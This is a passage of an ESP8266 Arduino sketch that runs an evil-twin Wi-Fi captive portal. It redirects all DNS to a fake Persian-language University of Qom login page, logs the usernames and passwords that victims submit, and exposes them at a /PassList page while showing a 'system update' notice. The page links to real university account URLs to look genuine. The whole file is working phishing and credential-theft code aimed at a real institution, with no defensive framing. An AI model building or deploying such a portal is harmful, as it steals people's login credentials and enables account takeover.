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\" alt=\"University Logo\">\n"
                    "    </div>\n"
                    "    <h2 id=\"login-header\">ورود به حساب کاربری</h2>\n"
                    "    <div class=\"inputBox\">\n"
                    "      <input type=\"text\" name=\"username_user\" id=\"username_user\" required autocomplete=\"off\">\n"
                    "    </div>\n"
                    "    <div class=\"inputBox\">\n"
                    "      <input type=\"password\" name=\"password_user\" id=\"password_user\" required autocomplete=\"off\">\n"
                    "    </div>\n"
                    "    <input type=\"submit\" id=\"submit-btn\" value=\"ورود\">\n"
                    "    <div id=\"error-message\" class=\"error-message\"></div>\n"
                    "    <div class=\"links\">\n"
                    "      <a href=\"https://account.qom.ac.ir/\" target=\"_blank\" id=\"forgot-password\">فراموشی رمز عبور</a>\n"
                    "      <a href=\"https://credit.qom.ac.ir/IBSng/user\" target=\"_blank\" id=\"user-portal\">خرید شارژ / پورتال کاربری</a>\n"
                    "    </div>\n"
                    "    <div class=\"footer\">\n"
                    "      <p id=\"footer-text\"></p>\n"
                    "    </div>\n"
                    "  </form>\n"
                    "</div>\n"
                    "</body>\n"
                    "</html>";
  return htmlCode;
}
String allUsersAndPasswords() {
  String result = "<ol>";
  
  result += Username_Pass;
  
  result += "</ol>"; 
  
  return header("Information:") + result + footer();
}

String postedUsernamePassword() {
  String username = input("username_user");
  String password = input("password_user");
  String data = "<li><b>Username: " + username + " | Password: " + password + "</b></li>";
  Username_Pass += data;

  String htmlContent = "<!DOCTYPE html>\n"
                       "<html lang=\"en\">\n"
                       "<head>\n"
                       "  <meta charset=\"UTF-8\">\n"
                       "  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n"
                       "  <title>You are logged in</title>\n"
                       "  <style>\n"
                       "    a,body,div,form,html,img,input,label,p,span {\n"
                       "      margin:0; padding:0; border:0; font-family:sans-serif,Arial;\n"
                       "    }\n"
                       "    body,html { min-height:100%; overflow-x:hidden; }\n"
                       "    body {\n"
                       "      background:#a2a09b;\n"
                       "      background:linear-gradient(135deg,hsla(236.6,0%,53.52%,1) 0,hsla(236.6,0%,53.52%,0) 70%),\n"
                       "                 linear-gradient(25deg,hsla(220.75,34.93%,26.52%,1) 10%,hsla(220.75,34.93%,26.52%,0) 80%),\n"
                       "                 linear-gradient(315deg,hsla(46.42,36.62%,83.92%,1) 15%,hsla(46.42,36.62%,83.92%,0) 80%),\n"
                       "                 linear-gradient(245deg,hsla(191.32,50.68%,56.45%,1) 100%,hsla(191.32,50.68%,56.45%,0) 70%);\n"
                       "    }\n"
                       "    a { color:#486173; }\n"
                       "    input,label { vertical-align:middle; white-space:normal; background:0 0; line-height:1; }\n"
                       "    label { position:relative; display:block; }\n"
                       "    p::first-letter { text-transform:uppercase; }\n"
                       "    .main { min-height:calc(100vh - 90px); width:100%; display:flex; flex-direction:column; }\n"
                       "    .ie-fixMinHeight { display:flex; }\n"
                       "    .ico { height:16px; position:absolute; top:0; left:0; margin-top:13px; margin-left:14px; }\n"
                       "    .logo { max-width:200px; display:block; margin:0 auto 30px auto; }\n"
                       "    .logo * { fill:#fff; }\n"
                       "    .lite .logo * { fill:#444; }\n"
                       "    h1 { text-align:center; color:#fff; font-size:24px!important; }\n"
                       "    * { box-sizing:border-box; font-size:16px; }\n"
                       "    .wrap { margin:auto; padding:40px; transition:width .3s ease-in-out; }\n"
                       "    @media only screen and (min-width:1px) and (max-width:575px){ .wrap {width:100%} }\n"
                       "    form { width:100%; margin-bottom:20px; }\n"
                       "    @keyframes fadeIn { from{opacity:0} to{opacity:1} }\n"
                       "    .fadeIn { animation-name:fadeIn; }\n"
                       "    .animated { animation-duration:1s; animation-fill-mode:both; }\n"
                       "    .info { color:#fff; text-align:center; margin-bottom:30px; }\n"
                       "    input { outline:0; appearance:none; }\n"
                       "    input:focus { outline:0; }\n"
                       "    input[type=password],input[type=text] { width:100%; border:1px solid transparent; height:44px; padding:3px 20px 3px 40px; margin-bottom:20px; border-radius:6px; background-color:rgba(255,255,255,.8); transition:box-shadow .3s ease-in-out; }\n"
                       "    input[type=password]:focus,input[type=text]:focus { box-shadow:0 0 5px 0 rgba(255,255,255,1); }\n"
                       "    .bt { opacity:.4; }\n"
                       "    input[type=submit] { background:#3e4d59; color:#fff; border:0; cursor:pointer; text-align:center; width:100%; height:44px; border-radius:6px; transition:background .3s ease-in-out; }\n"
                       "    input[type=submit]:focus,input[type=submit]:hover { background:#33404a; }\n"
                       "    table { border-collapse:collapse; width:100%; margin-bottom:20px; }\n"
                       "    table td { color:#fff; border-bottom:1px solid #e6e6e6; padding:10px 4px 10px 0; }\n"
                       "    table td:first-child { font-weight:700; }\n"
                       "    .lite { background:#fff; }\n"
                       "    .lite input[type=password],.lite input[type=text] { border:1px solid #c3c3c3; }\n"
                       "    .lite .info,.lite h1,.lite table td { color:#444; }\n"
                       "    .lite input[type=password]:focus,.lite input[type=text]:focus { box-shadow:0 0 5px 0 rgba(62,77,89,.2); }\n"
                       "    .dark { background:#343434; }\n"
                       "    .dark input[type=submit] { background:#dc3a41; }\n"
                       "    .dark input[type=submit]:focus,.dark input[type=submit]:hover { background:#b92f35; }\n"
                       "    .dark input[type=password],.dark input[type=text] { background-color:#fff; }\n"
                       "    .dark a { color:#dc3a41; }\n"
                       "    .dark table td { border-bottom:1px solid #505050; }\n"
                       "    .info.alert { color:#da3d41; }\n"
                       "    @media (min-width:576px){ .wrap { width:410px; } * { font-size:14px!important; } }\n"
                       "  </style>\n"
                       "</head>\n"
                       "<body>\n"
                       "  <div class=\"main\">\n"
                       "    <div class=\"wrap\" style=\"display: flex; justify-content: center; align-items: center; flex-direction: column; height: 100vh;\">\n"
                       "      <p class=\"info\">\n"
                       "        در حال به‌روزرسانی سیستم هستیم. لطفاً صبور باشید و بعداً مراجعه فرمایید.<br>\n"
                       "      </p>\n"
                       "    </div>\n"
                       "  </div>\n"
                       "</body>\n"
                       "</html>\n";
  return htmlContent;
}

String clear() {
  Username_Pass = "";
  passEnd = passStart;
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<div><p>The username and password lists have been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}


void BLINK() {
  for (int counter = 0; counter < 10; counter++)
  {
    digitalWrite(LED_BUILTIN, counter % 2);
    delay(500);
  }
}

void setup() {
  // Serial begin
  Serial.begin(115200);
  
  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  String checkValue = "first";

  for (int i = 0; i < checkValue.length(); ++i)
  {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i])
    {
      for (int i = 0; i < checkValue.length(); ++i)
      {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      EEPROM.write(0, '\0');
      EEPROM.write(passStart, '\0');
      EEPROM.commit();
      break;
    }
  }
  
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0') {
    ESSID += char(EEPROM.read(i));
    i++;
  }

  while (EEPROM.read(passEnd) != '\0')
  {
    allPass += char(EEPROM.read(passEnd));
    passEnd++;
  }
  
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));

  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;

  Serial.print("Current SSID: ");
  Serial.print(currentSSID);
  WiFi.softAP(currentSSID);  

  dnsServer.start(DNS_PORT, "*", APIP);
  webServer.on("/login", HTTP_POST, []() { webServer.send(200, "text/html", postedUsernamePassword()); BLINK(); });
  webServer.on("/PassList", HTTP_GET, []() { webServer.send(200, "text/html", allUsersAndPasswords()); });
  webServer.on("/clear", HTTP_GET, []() { webServer.send(200, "text/html", clear()); });
  webServer.onNotFound([]() { lastActivity=millis(); webServer.send(200, "text/html", index()); });
  webServer.begin();

  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
}


void loop() { 
  if ((millis() - lastTick) > TICK_TIMER) {lastTick = millis();} 
dnsServer.processNextRequest(); webServer.handleClient(); }